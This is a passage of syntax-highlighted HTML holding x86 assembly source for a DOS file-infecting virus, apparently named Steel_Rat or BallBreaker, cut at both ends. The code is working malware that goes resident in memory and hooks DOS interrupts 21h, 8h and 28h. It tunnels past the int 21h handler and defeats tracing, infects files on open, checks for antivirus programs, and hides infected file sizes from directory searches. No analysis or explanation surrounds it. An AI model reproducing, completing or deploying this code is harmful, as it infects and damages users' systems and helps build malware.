    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Patch it and create own block</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">NeededVlen</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">           </span><span class="sc1">; Get next block</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">           </span><span class="sc1">; Letter of previous block</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">70h</span><span class="sc0">          </span><span class="sc1">; Dos Block</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">NeededVlen</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; Needed memory</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc5">Copy_Us</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">15</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc5">Steel_Rat</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Copy our body</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Steel_Rat</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">Vlen</span><span class="sc4">+</span><span class="sc2">100</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new21</span><span class="sc0">     </span><span class="sc1">; Set int 21h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Joke</span><span class="sc0">      </span><span class="sc1">; Set int 8h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">

</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">i28U</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">i28</span><span class="sc0">       </span><span class="sc1">; Set int 28h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc9">EndIf</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">Inst</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">bailout</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">sti</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">install</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'! BallBreaker !'</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">NoStInt21</span><span class="sc0">
</span><span class="sc5">TryToGetInt21</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">F1</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; Allready traced ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">LetsTrace</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">LetsTrace</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; call to int 21. If nobody changed</span><span class="sc0">
</span><span class="sc5">JumpMux</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">; it, we would get real int 21h</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">; Get byte</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0EAh</span><span class="sc0">         </span><span class="sc1">; Far JMP ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ItsCall</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">09Ah</span><span class="sc0">         </span><span class="sc1">; Far Call ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ItsCall</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">FoundedInt21</span><span class="sc0">         </span><span class="sc1">; Nop ?</span><span class="sc0">
</span><span class="sc5">NotInt21</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Not founded :(</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FoundedInt21</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">; Next is Nop ?</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotInt21</span><span class="sc0">            </span><span class="sc1">; Nope..</span><span class="sc0">
    </span><span class="sc6">std</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">              </span><span class="sc1">; Nop !!!</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">Findi21</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">20</span><span class="sc0">
</span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">Findi21</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

    </span><span class="sc6">cld</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">i21</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Store offset</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">F1</span><span class="sc4">][</span><span class="sc8">Bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; No int 21 trace</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ItsCall</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">si</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">JumpMux</span><span class="sc0">
</span><span class="sc5">TryToGetInt21</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">
</span><span class="sc1">;-------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">nuke</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
    </span><span class="sc6">cli</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Lets try to drop trace flag</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02Eh</span><span class="sc0">        </span><span class="sc1">; Cs:</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">           </span><span class="sc1">; Fuck off trace !</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">stosw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Patch offset to return</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

    </span><span class="sc6">sti</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">nuke</span><span class="sc0">    </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc1">;---------------------- Resident Part --------------------------------</span><span class="sc0">
</span><span class="sc5">new21</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">f1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; Tunneled ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">SkipTun</span><span class="sc0">              </span><span class="sc1">; Yeap...</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">TunnelTry</span><span class="sc4">],</span><span class="sc5">TTry</span><span class="sc0">     </span><span class="sc1">; Somebody bails us ?</span><span class="sc0">
    </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">SkipTun</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Tunnelit</span><span class="sc0">               </span><span class="sc1">; Tunnel !</span><span class="sc0">
                </span><span class="sc1">; This would called until int 21h is traced...</span><span class="sc0">
                </span><span class="sc1">; If there were any anti-tracing routines</span><span class="sc0">
                </span><span class="sc1">; trace try's would be forever...</span><span class="sc0">
</span><span class="sc5">SkipTun</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0A1B1h</span><span class="sc0">               </span><span class="sc1">; Brother testing for us ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NotOurTest</span><span class="sc0">              </span><span class="sc1">; for us in memory ?</span><span class="sc0">
    
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">][</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Patch offset</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bp</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">joker</span><span class="sc4">],</span><span class="sc5">TNUM</span><span class="sc0">         </span><span class="sc1">; increase joker</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">Setup_Joke</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">joker</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">
</span><span class="sc5">Setup_Joke</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">joker</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">iret</span><span class="sc0">

</span><span class="sc5">NotOurTest</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">NoInt</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">AllOkWith21</span><span class="sc0">

</span><span class="sc9">if</span><span class="sc0">  </span><span class="sc5">AAV</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ch</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">IretIt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">NoInt</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">AllOkWith21</span><span class="sc0">
</span><span class="sc5">IretIt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">iret</span><span class="sc0">                    </span><span class="sc1">; Bail it out !</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">

</span><span class="sc5">AllOkWith21</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Bh</span><span class="sc0">              </span><span class="sc1">; Exec ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Exec</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">              </span><span class="sc1">; Find first ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Stealth</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">              </span><span class="sc1">; Find next ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Stealth</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">allow</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; Allowed to infect ?</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Not_Allowed</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Dh</span><span class="sc0">              </span><span class="sc1">; Open ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">Open</span><span class="sc0">

</span><span class="sc5">Not_Allowed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i21</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc1">;---------------------- Exec --------------------------------------</span><span class="sc0">
</span><span class="sc5">Exec</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">If</span><span class="sc0">  </span><span class="sc5">AAV</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CheckAv</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoIntz</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">NoInt</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">NoIntz</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc9">Endif</span><span class="sc0">
</span><span class="sc1">;   cmp cs:[allow],1        ; We couldn't infect files</span><span class="sc0">
</span><span class="sc1">;   jz Open             ; until Command.Com is loaded...</span><span class="sc0">
</span><span class="sc1">;                   ; But dont know why...</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">if_command</span><span class="sc0">         </span><span class="sc1">; So we need to test if command is</span><span class="sc0">
                    </span><span class="sc1">; allready loaded...</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Not_Allowed</span><span class="sc0"> 

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">allow</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">        </span><span class="sc1">; Allowed to infect.</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Not_Allowed</span><span class="sc0">
</span><span class="sc1">;--------------------- Open --------------------------------------</span><span class="sc0">
</span><span class="sc5">Open</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect</span><span class="sc0">         </span><span class="sc1">; Infect file</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Not_Allowed</span><span class="sc0">
</span><span class="sc1">;--------------------Stealth Filesize-----------------------------  </span><span class="sc0">
</span><span class="sc5">Stealth</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">i21</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Call dos</span><span class="sc0">

    </span><span class="sc6">pushf</span><span class="sc0">
    </span><span class="sc6">pusha</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Fh</span><span class="sc0">          </span><span class="sc1">; Get Dta to Es:Bx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Ds:Dx = Es:Bx</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">1Eh</span><span class="sc0">          </span><span class="sc1">; Add offset to name</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Scan</span><span class="sc0">           </span><span class="sc1">; Scan extension</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Not valid extension ?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">NoStealth</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">][</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get file time</span><span class="sc0">
    </span><span class="sc6">Call</span><span class="sc0"> </span><span class="sc5">CheckInfZ</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NoStealth</span><span class="sc0">           </span><span class="sc1">; Infected ?</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">][</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; If yes - make file smaller</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">][</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">NoStealth</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">  </span><span class="sc8">ds</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">
    </span><span class="sc6">popa</span><span class="sc0">
    </span><span class="sc6">popf</span><span class="sc0">
